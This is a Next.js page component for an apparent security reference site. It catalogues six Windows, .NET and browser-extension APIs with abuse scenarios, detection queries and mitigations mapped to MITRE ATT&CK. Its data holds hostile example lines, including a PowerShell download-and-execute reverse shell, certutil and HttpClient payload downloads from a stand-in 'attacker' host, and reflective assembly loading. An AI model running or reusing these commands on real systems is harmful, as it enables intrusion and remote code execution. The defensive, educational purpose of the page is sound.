import Link from 'next/link'

const apiDetails: Record<string, any> = {
  '1': {
    name: 'System.Diagnostics.Process.Start',
    category: 'Windows .NET',
    risk: 'Critical',
    techniques: ['T1059.001'],
    description: 'Execute arbitrary commands via .NET process execution',
    full_description: 'This .NET API allows direct process execution from C# code, enabling attackers to run arbitrary commands on the system. When WDAC blocks LOLBASBin, attackers use .NET Reflection and Process.Start to bypass controls.',
    signature: 'public static Process Start(string fileName, string? arguments = null)',
    parameters: [
      { name: 'fileName', type: 'string', description: 'Path to executable or script to run' },
      { name: 'arguments', type: 'string', description: 'Command-line arguments' },
    ],
    examples: [
      {
        language: 'Python',
        code: `import subprocess\nproc = subprocess.Popen("cmd.exe /c whoami", shell=True)\nproc.wait()`,
      },
      {
        language: 'curl',
        code: `# Would need to be executed through a .NET endpoint\ncurl -X POST http://target/api/execute -d '{"cmd":"whoami"}'`,
      },
      {
        language: 'PowerShell',
        code: `[System.Diagnostics.Process]::Start("cmd.exe", "/c whoami")`,
      },
    ],
    abuse_scenarios: [
      {
        title: 'Reverse Shell via Process.Start',
        description: 'Attacker uses Process.Start to launch reverse shell',
        code: `using System.Diagnostics;\nvar proc = Process.Start("cmd.exe", "/c powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell')");\nproc.WaitForExit();`,
      },
      {
        title: 'Living Off The Land via .NET',
        description: 'Launch built-in tools via .NET Process.Start',
        code: `Process.Start("certutil.exe", "-urlcache -split -f http://attacker/payload.exe C:\\\\temp\\\\payload.exe");`,
      },
    ],
    detection_strategies: [
      {
        name: 'ETW Process Creation',
        description: 'Monitor for System.Diagnostics.Process.Start via ETW event 10 (ProcessCreate)',
        query: 'Event.System.EventID=10 AND Image contains "PowerShell" OR Image contains "cmd.exe"',
      },
      {
        name: 'Sysmon Event Monitoring',
        description: 'Look for parent process relationships and command-line arguments',
        query: 'ParentImage contains "dotnet" OR ParentImage contains "csc.exe"',
      },
      {
        name: 'Network Behavioral Analysis',
        description: 'Detect outbound connections from .NET processes to external hosts',
        query: 'Process initiated network connection (EventID 3) from suspicious .NET process',
      },
    ],
    mitigation_strategies: [
      'Restrict .NET Framework and Core usage via AppLocker or WDAC',
      'Disable or restrict PowerShell and cmd.exe execution',
      'Monitor for unsigned .NET assemblies being loaded',
      'Implement network segmentation to prevent lateral movement',
      'Use .NET hardening techniques (StrongNaming, CAS)',
    ],
    related_apis: ['3', '4'],
    references: [
      { title: 'Microsoft Docs - Process.Start', url: 'https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.start' },
      { title: 'MITRE ATT&CK - T1059.001', url: 'https://attack.mitre.org/techniques/T1059/001/' },
    ],
  },
  '2': {
    name: 'WMI Win32_Process.Create',
    category: 'Windows COM',
    risk: 'Critical',
    techniques: ['T1047'],
    description: 'Create processes via WMI for command execution',
    full_description: 'WMI (Windows Management Instrumentation) provides COM-based access to create processes. This is commonly used by admins but attackers leverage it for lateral movement and execution.',
    signature: 'Win32_Process.Create(string CommandLine, string CurrentDirectory, Win32_ProcessStartup ProcessStartupInformation, uint32 ProcessId)',
    parameters: [
      { name: 'CommandLine', type: 'string', description: 'Full command line to execute' },
      { name: 'CurrentDirectory', type: 'string', description: 'Working directory for the process' },
      { name: 'ProcessStartupInformation', type: 'Win32_ProcessStartup', description: 'Startup configuration' },
    ],
    examples: [
      {
        language: 'PowerShell',
        code: `$proc = Invoke-WmiMethod -Path "Win32_Process" -Name Create -ArgumentList "cmd.exe /c whoami"\n$procId = $proc.processId\nWrite-Host "Process ID: $procId"`,
      },
      {
        language: 'Python',
        code: `import wmi\nwmi_obj = wmi.WMI()\nwmi_obj.Win32_Process.Create(CommandLine="cmd.exe /c ipconfig")`,
      },
      {
        language: 'curl',
        code: `# Would require a WMI interface/wrapper\ncurl -X POST http://target/wmi/execute -d '{"class":"Win32_Process","method":"Create","args":"cmd.exe /c whoami"}'`,
      },
    ],
    abuse_scenarios: [
      {
        title: 'Lateral Movement via WMI',
        description: 'Attacker uses WMI on remote system to execute commands',
        code: `$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\\\\user", $password)\n$proc = Invoke-WmiMethod -ComputerName "TARGET" -Path "Win32_Process" -Name Create -ArgumentList "cmd.exe /c whoami" -Credential $cred`,
      },
      {
        title: 'Living Off The Land via WMI',
        description: 'Execute certutil or other LOLBins via WMI',
        code: `Invoke-WmiMethod -Path "Win32_Process" -Name Create -ArgumentList "certutil.exe -urlcache -split -f http://attacker/payload.exe C:\\\\temp\\\\payload.exe"`,
      },
    ],
    detection_strategies: [
      {
        name: 'WMI Event Auditing',
        description: 'Monitor WMI process creation via Event ID 5857 or ETW',
        query: 'EventID=5857 OR WmiEventType contains "ProcessCreate"',
      },
      {
        name: 'Network Detection',
        description: 'Monitor for RPC communication (port 135, 445) associated with WMI calls',
        query: 'Network traffic to port 445 or 135 from suspicious parent process',
      },
    ],
    mitigation_strategies: [
      'Disable WMI or restrict via WMI namespace security',
      'Implement network-level authentication (NLA) for RDP',
      'Use Kerberos encryption for remote connections',
      'Monitor and log WMI event creation',
    ],
    related_apis: ['1'],
    references: [
      { title: 'MSDN - Win32_Process', url: 'https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process' },
      { title: 'MITRE ATT&CK - T1047', url: 'https://attack.mitre.org/techniques/T1047/' },
    ],
  },
  '3': {
    name: 'Reflection.Assembly.Load',
    category: 'Windows .NET',
    risk: 'High',
    techniques: ['T1129'],
    description: 'Load arbitrary .NET assemblies for code execution',
    full_description: 'Reflection allows .NET code to dynamically load assemblies at runtime. Attackers use this to load malicious .NET assemblies from network locations or memory.',
    signature: 'public static Assembly Load(byte[] rawAssembly)',
    parameters: [
      { name: 'rawAssembly', type: 'byte[]', description: 'Raw assembly bytes to load' },
    ],
    examples: [
      {
        language: 'PowerShell',
        code: `$url = "http://attacker/malicious.dll"\n$wc = New-Object Net.WebClient\n$bytes = $wc.DownloadData($url)\n[Reflection.Assembly]::Load($bytes)`,
      },
      {
        language: 'Python',
        code: `# Pseudo-code for concept\nimport requests\nurl = "http://attacker/malicious.dll"\nassembly_bytes = requests.get(url).content\n# Would require .NET interop`,
      },
      {
        language: 'curl',
        code: `# Download malicious DLL\ncurl -o payload.dll http://attacker/malicious.dll`,
      },
    ],
    abuse_scenarios: [
      {
        title: 'Reflective DLL Injection',
        description: 'Load and execute DLL from memory',
        code: `[byte[]] $bytes = [System.IO.File]::ReadAllBytes("C:\\\\temp\\\\Payload.dll")\n[Reflection.Assembly]::Load($bytes).GetType("YourNamespace.YourClass").GetMethod("Main").Invoke($null, $null)`,
      },
    ],
    detection_strategies: [
      {
        name: 'ETW Assembly Loading',
        description: 'Monitor for System.Reflection.Assembly.Load calls',
        query: 'ETW ModuleLoad event from suspicious process',
      },
    ],
    mitigation_strategies: [
      'Implement StrongName verification for loaded assemblies',
      'Use Code Access Security (CAS) policies',
      'Restrict assembly loading to known safe paths',
    ],
    related_apis: ['1', '4'],
    references: [
      { title: 'Microsoft Docs - Assembly.Load', url: 'https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load' },
    ],
  },
  '4': {
    name: 'HttpClient.GetAsync',
    category: 'Windows .NET',
    risk: 'High',
    techniques: ['T1071'],
    description: 'Download files and execute remote payloads',
    full_description: 'HttpClient provides network communication capabilities in .NET, allowing attackers to download payloads and exfiltrate data.',
    signature: 'public Task<HttpResponseMessage> GetAsync(string requestUri)',
    parameters: [
      { name: 'requestUri', type: 'string', description: 'URL to fetch content from' },
    ],
    examples: [
      {
        language: 'PowerShell',
        code: `$client = New-Object System.Net.Http.HttpClient\n$response = $client.GetAsync("http://attacker/payload.exe").Result\n$bytes = $response.Content.ReadAsByteArrayAsync().Result`,
      },
      {
        language: 'Python',
        code: `import aiohttp\nimport asyncio\nasync def download():\n    async with aiohttp.ClientSession() as session:\n        async with session.get('http://attacker/payload.exe') as resp:\n            return await resp.read()`,
      },
      {
        language: 'curl',
        code: `curl -o payload.exe http://attacker/payload.exe`,
      },
    ],
    abuse_scenarios: [
      {
        title: 'Download and Execute Payload',
        description: 'Download payload and execute via reflection',
        code: `$client = New-Object System.Net.Http.HttpClient\n$response = $client.GetAsync("http://attacker/payload.dll").Result\n$bytes = $response.Content.ReadAsByteArrayAsync().Result\n[Reflection.Assembly]::Load($bytes)`,
      },
    ],
    detection_strategies: [
      {
        name: 'Network Monitoring',
        description: 'Monitor for HTTP requests from .NET processes to suspicious URLs',
        query: 'Network event with suspicious URL pattern from dotnet/pwsh process',
      },
    ],
    mitigation_strategies: [
      'Block outbound HTTP to untrusted domains via firewall',
      'Implement DNS filtering',
      'Monitor egress traffic for anomalies',
    ],
    related_apis: ['1', '3'],
    references: [
      { title: 'Microsoft Docs - HttpClient.GetAsync', url: 'https://docs.microsoft.com/en-us/dotnet/api/system.net.http.httpclient.getasync' },
    ],
  },
  '5': {
    name: 'VirtualAllocEx',
    category: 'Native APIs',
    risk: 'High',
    techniques: ['T1548'],
    description: 'Allocate memory in remote process for code injection',
    full_description: 'VirtualAllocEx allows allocation of memory in another process, commonly used for code injection attacks.',
    signature: 'LPVOID VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)',
    parameters: [
      { name: 'hProcess', type: 'HANDLE', description: 'Handle to the target process' },
      { name: 'lpAddress', type: 'LPVOID', description: 'Desired base address (usually NULL)' },
      { name: 'dwSize', type: 'SIZE_T', description: 'Size of allocation' },
      { name: 'flAllocationType', type: 'DWORD', description: 'MEM_COMMIT, MEM_RESERVE, etc.' },
      { name: 'flProtect', type: 'DWORD', description: 'PAGE_EXECUTE_READWRITE, etc.' },
    ],
    examples: [
      {
        language: 'PowerShell',
        code: `Add-Type -MemberDefinition '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flAllocationType, uint flProtect);' -Name WinApi -Namespace Win32\n$handle = Get-Process target | Select-Object -ExpandProperty Handle\n$addr = [Win32.WinApi]::VirtualAllocEx($handle, [IntPtr]::Zero, 1024, 0x1000, 0x40)`,
      },
      {
        language: 'Python',
        code: `# Would require ctypes and Windows API knowledge\nimport ctypes\nkernel32 = ctypes.windll.kernel32\nhProcess = kernel32.OpenProcess(0x001F0FFF, False, pid)\nalloc = kernel32.VirtualAllocEx(hProcess, None, 1024, 0x1000, 0x40)`,
      },
      {
        language: 'curl',
        code: `# This is a native Windows API, not typically used via HTTP`,
      },
    ],
    abuse_scenarios: [
      {
        title: 'Code Injection into Remote Process',
        description: 'Allocate memory, write shellcode, create thread',
        code: `# 1. Open process\n# 2. VirtualAllocEx to get buffer\n# 3. WriteProcessMemory to write shellcode\n# 4. CreateRemoteThread to execute`,
      },
    ],
    detection_strategies: [
      {
        name: 'Sysmon Event Monitoring',
        description: 'Monitor for CreateRemoteThread + VirtualAllocEx pattern',
        query: 'EventID 8 (CreateRemoteThread) preceded by VirtualAllocEx',
      },
    ],
    mitigation_strategies: [
      'Enable Data Execution Prevention (DEP)',
      'Use Control Flow Guard (CFG)',
      'Monitor for suspicious memory allocations',
      'Implement process tamper protection',
    ],
    related_apis: [],
    references: [
      { title: 'Microsoft Docs - VirtualAllocEx', url: 'https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex' },
    ],
  },
  '6': {
    name: 'Chrome storage.sync',
    category: 'Browser Ext',
    risk: 'Medium',
    techniques: ['T1133'],
    description: 'Persist data in browser storage across restarts',
    full_description: 'Chrome extension storage.sync allows extensions to persist data across browser restarts and devices. Malicious extensions can use this for persistence.',
    signature: 'chrome.storage.sync.set(object items, function callback)',
    parameters: [
      { name: 'items', type: 'object', description: 'Key-value pairs to store' },
      { name: 'callback', type: 'function', description: 'Called when operation completes' },
    ],
    examples: [
      {
        language: 'JavaScript',
        code: `chrome.storage.sync.set({\n  'malicious_data': 'C2_URL_or_config',\n  'persistence_flag': true\n}, function() {\n  console.log('Data synced');\n});`,
      },
      {
        language: 'Python',
        code: `# Extension installation via Python:\nimport subprocess\nsubprocess.run(['chrome', '--load-extension=path/to/malicious/extension'])`,
      },
      {
        language: 'curl',
        code: `# Extension installation via HTTP not directly possible`,
      },
    ],
    abuse_scenarios: [
      {
        title: 'Browser Extension Persistence',
        description: 'Malicious extension persists configuration and C2 URL',
        code: `// In manifest.json\n{\n  "permissions": ["storage", "http://*/*", "https://*/*"],\n  "background": {"scripts": ["bg.js"]}\n}\n// In bg.js\nchrome.storage.sync.set({'config': 'C2_config'});`,
      },
    ],
    detection_strategies: [
      {
        name: 'Extension Monitoring',
        description: 'Monitor for suspicious extensions in user profiles',
        query: 'Check Chrome extensions folder for unknown extensions',
      },
      {
        name: 'Network Behavioral Analysis',
        description: 'Monitor for unusual network connections from browser process',
        query: 'Outbound HTTPS to uncommon domains from chrome.exe',
      },
    ],
    mitigation_strategies: [
      'Restrict extension installation to approved list',
      'Use managed policies to block extensions',
      'Monitor extension permissions',
      'Educate users about suspicious extensions',
    ],
    related_apis: [],
    references: [
      { title: 'Chrome Extension Docs - storage.sync', url: 'https://developer.chrome.com/docs/extensions/reference/storage/' },
    ],
  },
}

export async function generateStaticParams() {
  return [
    { id: '1' },
    { id: '2' },
    { id: '3' },
    { id: '4' },
    { id: '5' },
    { id: '6' },
  ]
}

type Props = {
  params: {
    id: string
  }
}

export default function APIDetail({ params }: Props) {
  const id = params.id
  const api = apiDetails[id]

  if (!api) {
    return (
      <div className="min-h-screen flex flex-col">
        <section className="bg-gradient-purple text-white py-12">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <h1 className="text-4xl font-bold mb-4">API Not Found</h1>
            <p className="text-lg opacity-90">
              The API you're looking for doesn't exist or has been removed.
            </p>
            <Link href="/api-browser" className="inline-block mt-6 cta-primary">
              Back to API Browser →
            </Link>
          </div>
        </section>
      </div>
    )
  }

  const getRiskColor = (risk: string) => {
    switch (risk) {
      case 'Critical':
        return 'bg-red-100 text-red-800'
      case 'High':
        return 'bg-orange-100 text-orange-800'
      case 'Medium':
        return 'bg-yellow-100 text-yellow-800'
      default:
        return 'bg-green-100 text-green-800'
    }
  }

  return (
    <>
      {/* Header */}
      <section className="bg-gradient-purple text-white py-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <Link href="/api-browser" className="text-blue-200 hover:text-white mb-4 inline-block">
            ← Back to API Browser
          </Link>
          <h1 className="text-4xl font-bold mb-4">{api.name}</h1>
          <p className="text-lg opacity-90 mb-4">{api.description}</p>
          <div className="flex flex-wrap gap-3">
            <span className={`px-3 py-1 rounded-full text-sm font-semibold ${getRiskColor(api.risk)}`}>
              Risk: {api.risk}
            </span>
            <span className="px-3 py-1 bg-white bg-opacity-20 rounded-full text-sm">
              Category: {api.category}
            </span>
            {api.techniques.map((tech: string) => (
              <span key={tech} className="px-3 py-1 bg-white bg-opacity-20 rounded-full text-sm">
                {tech}
              </span>
            ))}
          </div>
        </div>
      </section>

      {/* Content */}
      <section className="py-16">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
          {/* Overview */}
          <div className="mb-12">
            <h2 className="text-3xl font-bold mb-4">Overview</h2>
            <p className="text-gray-600 text-lg">{api.full_description}</p>
          </div>

          {/* API Signature */}
          <div className="mb-12 bg-slate-50 rounded-lg p-6 border border-slate-200">
            <h2 className="text-2xl font-bold mb-4">API Signature</h2>
            <code className="text-sm text-gray-800 break-all">{api.signature}</code>
          </div>

          {/* Parameters */}
          <div className="mb-12">
            <h2 className="text-3xl font-bold mb-6">Parameters</h2>
            <div className="overflow-x-auto">
              <table className="w-full border-collapse">
                <thead>
                  <tr className="bg-gray-100">
                    <th className="border border-gray-300 px-4 py-2 text-left font-semibold">Parameter</th>
                    <th className="border border-gray-300 px-4 py-2 text-left font-semibold">Type</th>
                    <th className="border border-gray-300 px-4 py-2 text-left font-semibold">Description</th>
                  </tr>
                </thead>
                <tbody>
                  {api.parameters.map((param: any, idx: number) => (
                    <tr key={idx} className={idx % 2 === 0 ? 'bg-white' : 'bg-gray-50'}>
                      <td className="border border-gray-300 px-4 py-2 font-mono text-sm">{param.name}</td>
                      <td className="border border-gray-300 px-4 py-2 font-mono text-sm text-purple-600">{param.type}</td>
                      <td className="border border-gray-300 px-4 py-2 text-sm">{param.description}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>

          {/* Code Examples */}
          <div className="mb-12">
            <h2 className="text-3xl font-bold mb-6">Code Examples</h2>
            <div className="space-y-4">
              {api.examples.map((example: any, idx: number) => (
                <div key={idx}>
                  <h3 className="text-lg font-semibold mb-2">{example.language}</h3>
                  <pre className="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm">
                    <code>{example.code}</code>
                  </pre>
                </div>
              ))}
            </div>
          </div>

          {/* Abuse Scenarios */}
          <div className="mb-12">
            <h2 className="text-3xl font-bold mb-6">Abuse Scenarios</h2>
            <div className="space-y-6">
              {api.abuse_scenarios.map((scenario: any, idx: number) => (
                <div key={idx} className="border-l-4 border-red-500 pl-6">
                  <h3 className="text-xl font-semibold mb-2">{scenario.title}</h3>
                  <p className="text-gray-600 mb-3">{scenario.description}</p>
                  <pre className="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm">
                    <code>{scenario.code}</code>
                  </pre>
                </div>
              ))}
            </div>
          </div>

          {/* Detection Strategies */}
          <div className="mb-12">
            <h2 className="text-3xl font-bold mb-6">Detection Strategies</h2>
            <div className="space-y-4">
              {api.detection_strategies.map((detection: any, idx: number) => (
                <div key={idx} className="bg-blue-50 border border-blue-200 rounded-lg p-6">
                  <h3 className="text-lg font-semibold text-blue-900 mb-2">{detection.name}</h3>
                  <p className="text-gray-700 mb-3">{detection.description}</p>
                  <div className="bg-white rounded p-3 border border-blue-200 font-mono text-sm text-gray-800">
                    {detection.query}
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Mitigation Strategies */}
          <div className="mb-12">
            <h2 className="text-3xl font-bold mb-6">Mitigation Strategies</h2>
            <ul className="space-y-2">
              {api.mitigation_strategies.map((strategy: string, idx: number) => (
                <li key={idx} className="flex gap-3 text-gray-700">
                  <span className="text-green-600 font-bold">✓</span>
                  <span>{strategy}</span>
                </li>
              ))}
            </ul>
          </div>

          {/* Related APIs */}
          {api.related_apis && api.related_apis.length > 0 && (
            <div className="mb-12">
              <h2 className="text-3xl font-bold mb-6">Related APIs</h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {api.related_apis.map((relatedId: string) => {
                  const relatedApi = apiDetails[relatedId]
                  return (
                    <Link key={relatedId} href={`/apis/${relatedId}`}>
                      <div className="border border-gray-300 rounded-lg p-4 hover:shadow-lg hover:border-purple-500 transition">
                        <h3 className="font-bold text-purple-600 hover:text-purple-700">{relatedApi.name}</h3>
                        <p className="text-sm text-gray-600 mt-1">{relatedApi.description}</p>
                      </div>
                    </Link>
                  )
                })}
              </div>
            </div>
          )}

          {/* References */}
          <div className="mb-12">
            <h2 className="text-3xl font-bold mb-6">References</h2>
            <ul className="space-y-2">
              {api.references.map((ref: any, idx: number) => (
                <li key={idx}>
                  <a href={ref.url} target="_blank" rel="noopener noreferrer" className="text-purple-600 hover:underline">
                    {ref.title} →
                  </a>
                </li>
              ))}
            </ul>
          </div>

          {/* Back to Browser */}
          <div className="text-center pt-8 border-t border-gray-200">
            <Link href="/api-browser" className="cta-primary inline-block">
              Back to API Browser →
            </Link>
          </div>
        </div>
      </section>
    </>
  )
}
